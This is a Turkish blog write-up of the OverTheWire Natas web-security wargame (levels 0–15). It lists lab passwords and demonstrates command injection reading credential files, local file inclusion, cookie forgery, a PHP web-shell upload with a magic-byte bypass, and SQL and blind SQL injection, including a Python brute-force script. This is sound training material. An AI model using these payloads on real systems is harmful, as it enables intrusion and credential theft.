@@ -1,0 +1,678 @@
+---
+layout: post
+title:  "Natas"
+subtitle: "Natas Çözümleri"
+date: 2019-11-05 01:34:01 +0200
+categories: [writeup]
+---
+
+
+###### Her bir komut için açıklamalar MAN ve HELP bölümlerinden alınmıştır.
+
+###### Ayrıca, yazılan parametreler olabildiğince açıklanmaya çalışılmıştır.
+
+###### Bazı bölümler ise writeuplara bakılarak çözülmüştür.
+
+###### Bence, level numaraları yanlış; hepsine +1 eklenmelidir.
+
+Natas 0
+======
+
+**http://natasX.natas.labs.overthewire.org**
+
+Hint;
+- All passwords are also stored in /etc/natas_webpass/
+
++ Username: natas0
+
++ Password: natas0
+
++ URL:      http://natas0.natas.labs.overthewire.org
+
+Verilen bilgiler kullanılarak başlandığında yönlendirilen sayfa içerisinde password, page sourceda yer almaktadır.
+
+```terminal
+<div id="content">
+You can find the password for the next level on this page.
+
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+</div>
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "gtVrDuiDfck831PqWsLEZy5gyDz1clto")
+
+
+Natas Level 0 → Level 1
+======
+
++ Username: natas1
+
++ URL:      http://natas1.natas.labs.overthewire.org
+
+Giriş için password bir önceki levelda bulunmuştu.
+
+Hint;
+
+- You can find the password for the next level on this page, but rightclicking has been blocked! 
+
+Bazen rightclick blocked olsada klavye kısayolları kullanılabilmektedir. **CTRL + U** ile page sourcea bakılabilir. Ayrıca kullanılan browserın menüsünden de yardım alınabilir.
+
+```terminal
+<div id="content">
+You can find the password for the
+next level on this page, but rightclicking has been blocked!
+
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+</div>
+```
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi")
+
+Natas Level 1 → Level 2
+======
+
++ Username: natas2
++ URL:      http://natas2.natas.labs.overthewire.org
+
+Hint;
+- There is nothing on this page 
+
+```terminal
+<body>
+<h1>natas2</h1>
+<div id="content">
+There is nothing on this page
+<img src="files/pixel.png">
+</div>
+</body></html>
+```
+
+source olarak verilen path dikkat çekmektedir.
+
+
+```terminal
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14")
+
+
+Natas Level 2 → Level 3
+======
+
++ Username: natas3
++ URL:      http://natas3.natas.labs.overthewire.org
+
+###### You should know
+
+**google advanced search**
+
+**robots.txt:** Robots.txt dosyası, arama motoru tarayıcılarına sitenizden isteyebilecekleri ve isteyemeyecekleri sayfaları veya dosyaları söyler.
+
+Hint;
+````
+<div id="content">
+There is nothing on this page
+<!-- No more information leaks!! Not even Google will find it this time... -->
+</div>
+</body></html>
+````
+
+```terminal
+http://natas3.natas.labs.overthewire.org/robots.txt
+User-agent: *
+Disallow: /s3cr3t/
+```
+```terminal
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ")
+
+
+Natas Level 3 → Level 4
+======
+
++ Username: natas4
+
++ URL:      http://natas4.natas.labs.overthewire.org
+
+Hint;
+- Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+
+Burp kullanılarak,
+
+```terminal
+Connection: close
+Referer: http://natas4.natas.labs.overthewire.org/
+```
+
+bölümündeki  natas4 natas5 ile değiştirildiğinde password elde edilmiştir.
+
+```terminal
+<div id="content">
+
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+<br/>
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq")
+
+
+Natas Level 4 → Level 5
+======
+
++ Username: natas5
+
++ URL:      http://natas5.natas.labs.overthewire.org
+
+Burp içeriğinde,
+
+```terminal
+Connection: close
+Cookie: __cfduid=dba01fedb212ee987ed2e92c10e138e961572421136; loggedin=0
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Cache-Control: max-age=0
+```
+
+_loggedin__ kısmını 1 yaparak password elde edilmiştir.
+
+```terminal
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1")
+
+
+Natas Level 5 → Level 6
+======
+
++ Username: natas6
++ URL:      http://natas6.natas.labs.overthewire.org
+
+Hint;
+- sourcecode
+
+```terminal
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+```
+
+include kısmında verilen path kullanılarak credential elde edilmiştir. Input Secret alanına yazılarak password elde edilmiştir.
+
+
+```terminal
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+``` 
+
+![Page SS](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/natas/natas6.jpg "ss"
+
+
+```terminal
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9")
+
+
+Natas Level 6 → Level 7
+======
+
++ Username: natas7
++ URL:      http://natas7.natas.labs.overthewire.org
+
+Hint;
+-  password for webuser natas8 is in /etc/natas_webpass/natas8
+
+```terminal
+http://natas7.natas.labs.overthewire.org/index.php?page=about
+```
+
+şeklindeki URL in **about** kısmı yerine hint de verilen bilgi yazılmıştır.
+
+```terminal
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8Home 
+```
+
+Böylelikle password elde edilmiştir.
+
+```terminal
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe")
+
+
+Natas Level 7 → Level 8
+======
+
++ Username: natas8
++ URL:      http://natas8.natas.labs.overthewire.org
+
+Hint;
+- Sourcecode
+
+```terminal
+<?
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+```
+
+Yukarıdaki kodda function incelendiğinde value bir dizi encryption işlemine tabi tutulmuş ve if bloğunda input ile kıyaslanmaktadır. EncodedSecret değerini decode için https://www.w3schools.com/php/phptryit.asp?filename=tryphp_func_string_hex2bin sitesi decoder olarak kullanılmıştır. Elde edilen değer https://www.w3schools.com/php/phptryit.asp?filename=tryphp_func_string_strrev yardımıyla reverse edilmiş ve Burp decoder ile base64 decode edilmiştir. Sonrasında elde edilen output natas8 de input olarak kullanılarak password elde edilmiştir.
+
+```terminal
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
+Output:
+
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl")
+
+
+Natas Level 8 → Level 9
+======
+
++ Username: natas9
++ URL:      http://natas9.natas.labs.overthewire.org
+
+Hint;
+- sourcecode
+
+```terminal
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+key variableındaki değeri dictionary içerisinden grep ile getirmektedir. Terminalde aynı satırda bir fazla, birbirinden farklı komutlar operatörler yardımıyla çalıştırılabilmektedir. 
+
+**nat:** herhangi bir değer, key variable için yazılmıştır.
+
+**;** ifadesiyle yeni bir komut yazılacağı belirtilmiştir.
+
+**#** ifadesiyle kendisinden sonra gelen bölüm command line olarak tanınması sağlanmıştır.
+
+```terminal
+nat; cat /etc/natas_webpass/natas10 #
+```
+
+```termilnal
+Output:
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu")
+
+
+Natas Level 9 → Level 10
+======
+
++ Username: natas10
++ URL:      http://natas10.natas.labs.overthewire.org
+
+Hint;
+- sourcecode
+
+```terminal
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+```
+
+Bu levelda input alanı için filtreleme yapılmıştır. Fakat;
+
+```terminal
+. cat /etc/natas_webpass/natas10 #
+-i a cat /etc/natas_webpass/natas10 #
+n cat /etc/natas_webpass/natas10 #
+a cat /etc/natas_webpass/natas10
+```
+
+komutlarından herhangi birisi istenilen sonucu verecektir. Son satırda da olduğu source code da yer alan grep için ikibi bir kaynak verilmiştir.
+
+```terminal
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK")
+
+
+Natas Level 10 → Level 11
+======
+
++ Username: natas11
++ URL:      http://natas11.natas.labs.overthewire.org
+
+Hint;
+- Cookies are protected with XOR encryption
+- Sourcecode
+
+source code içerisinde xor_encrypt fonksyionu ve "$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);" satırlarına dikkat edildiğin, cookie kullanılarak **key** öğrenilebilmektedir. 
+
+Cookie değeri (url dencode): ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+
+http://www.writephponline.com/ sitesi kullanılarak aşağıdaki kodlar ile
+
+```terminal
+function xor_encrypt($in) 
+{
+    $key  = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    $text = $in;
+    $outText = '';
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) 
+ {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+ }
+    return $outText;
+}
+echo (xor_encrypt(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw")));
+```
+
+```terminal
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+``` 
+
+elde edilmiştir. Burada **key** variableına "qw8J" değerini verip tekrar çalıştırdığında json formatındaki datanın encode halinin return edildiği görülmektedir.
+
+```terminal
+ function xor_encrypt1() {  
+   $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));  
+   $key = "qw8J";    
+   $outText = '';  
+   // Iterate through each character  
+   for($i=0;$i<strlen($text);$i++) {  
+   $outText .= $text[$i] ^ $key[$i % strlen($key)];  
+   }  
+   return $outText;  
+ }  
+ print base64_encode(xor_encrypt1());
+```
+
+```terminal
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+```
+
+Burp ile cookie değiştirilip gönderilerek password elde edilmiştir.
+
+```terminal
+Cookies are protected with XOR encryption<br/><br/>
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
+```
+
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3")
+
+
+Natas Level 11 → Level 12
+======
+
++ Username: natas12
++ URL:      http://natas12.natas.labs.overthewire.org
+
+Hint;
+- Sourcecode
+
+
+```terminal
+<?php
+passthru('cat /etc/natas_webpass/natas13');
+?>
+```
+
+Bir dosyaya yukarıdaki komutaları kaydedip servera upload edilmiştir. Bu sırada Burp ile gönderilen dosyaya rastgele isim atandığında jpg uzantısı yerine php yazılarak gönderilmiştir. Serverın verdiği urle gidilerek password elde edilmiştir.
+
+![Page SS](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/natas/natas12.jpg "ss"
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY")
+
+
+Natas Level 12 → Level 13
+======
+
++ Username: natas13
++ URL:      http://natas13.natas.labs.overthewire.org
+
+Hint;
+- Sourcecode
+
+Sourcecode'a bir önceki seviyeden farklı olarak exif_imagetype fonksiyonu eklenmiş. Sadece dosya uzantısını değiştirmek işe yaramamaktadır. https://hexed.it/ sitesinden faydalanarak bir jpg dosyasının ilk bitleri olan **FFD8FFE0** ifadesini php dosyasına eklenerek exif_imagetype fonksiyonu bypass edilebilmektedir. 
+
+Sonraki adımları bir önceki levelda olduğu gibi ilerletilerek password elde edilmiştir. 
+
+natas14.php dosyasını [link](https://github.com/JohnGkmn/JohnGkmn.github.io/blob/master/css/natas/natas14.php) üzerinden inceleyebilirsiniz.
+
+![Page SS](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/natas/natas14.jpg "ss"
+
+![Page SS](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/natas/natas14pw.jpg "ss"
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1")
+
+
+Natas Level 13 → Level 14
+======
+
++ Username: natas14
++ URL:      http://natas14.natas.labs.overthewire.org
+
+###### You should know
+
+**SQL Injection:** bu konuyla fikir sahibi olduktan sonra devam edilmedilir.
+
+Hint;
+-  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
+
+```terminal
+"or"1"="1
+```
+
+ifadesi username, password alanlarına girilerek password elde edilmiştir. Bu kod yerine, **"or"1"="1" #** ifadesini sadece username alanına girerekte password elde edilebilir
+
+```terminal
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
+
+
+Natas Level 14 → Level 15
+======
+
++ natas15
++ URL:      http://natas15.natas.labs.overthewire.org
+
+###### You should now
+
+**Blind SQL Injection** 
+
+Hint;
+- CREATE TABLE `users` (
+- `username` varchar(64) DEFAULT NULL,
+- `password` varchar(64) DEFAULT NULL); 
+
+https://www.w3schools.com/sql/sql_datatypes.asp adresinden _varchar(64)_ variable tipi için bilgi edinilebilir.
+
+![Page SS](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/natas/natas15.jpg "ss"
+
+Python ile yazılan(ALINTIDIR) aşağıdaki script password elde edilebilmektedir.
+
+```terminal
+import requests
+from requests.auth import HTTPBasicAuth
+
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+filtered = ''
+passwd = ''
+
+for char in chars:
+    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+    if 'exists' in r.text :
+        filtered = filtered + char
+        print (filtered)
+
+for i in range(0,32):
+    for char in filtered:
+        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
+        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+        if 'exists' in r.text :
+            passwd = passwd + char
+            print(passwd)
+            break
+
+```
+
+```terminal
+a
+ac
+ace
+aceh
+acehi
+acehij
+acehijm
+acehijmn
+acehijmnp
+acehijmnpq
+acehijmnpqt
+acehijmnpqtw
+acehijmnpqtwB
+acehijmnpqtwBE
+acehijmnpqtwBEH
+acehijmnpqtwBEHI
+acehijmnpqtwBEHIN
+acehijmnpqtwBEHINO
+acehijmnpqtwBEHINOR
+acehijmnpqtwBEHINORW
+acehijmnpqtwBEHINORW0
+acehijmnpqtwBEHINORW03
+acehijmnpqtwBEHINORW035
+acehijmnpqtwBEHINORW0356
+acehijmnpqtwBEHINORW03569
+W
+Wa
+WaI
+WaIH
+WaIHE
+WaIHEa
+WaIHEac
+WaIHEacj
+WaIHEacj6
+WaIHEacj63
+WaIHEacj63w
+WaIHEacj63wn
+WaIHEacj63wnN
+WaIHEacj63wnNI
+WaIHEacj63wnNIB
+WaIHEacj63wnNIBR
+WaIHEacj63wnNIBRO
+WaIHEacj63wnNIBROH
+WaIHEacj63wnNIBROHe
+WaIHEacj63wnNIBROHeq
+WaIHEacj63wnNIBROHeqi
+WaIHEacj63wnNIBROHeqi3
+WaIHEacj63wnNIBROHeqi3p
+WaIHEacj63wnNIBROHeqi3p9
+WaIHEacj63wnNIBROHeqi3p9t
+WaIHEacj63wnNIBROHeqi3p9t0
+WaIHEacj63wnNIBROHeqi3p9t0m
+WaIHEacj63wnNIBROHeqi3p9t0m5
+WaIHEacj63wnNIBROHeqi3p9t0m5n
+WaIHEacj63wnNIBROHeqi3p9t0m5nh
+WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
+
+
+
+Natas Level 14 → Level 15
+======
+
+Coming soon
+
+
+![ToDoList](https://image.flaticon.com/icons/svg/2246/2246610.svg "Task")
+
+_____
+
+Want to suggest something? Please [Send me a request](https://github.com/JohnGkmn/JohnGkmn.github.io/issues/new).
+![writeup](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/map-location.png "walktrough")
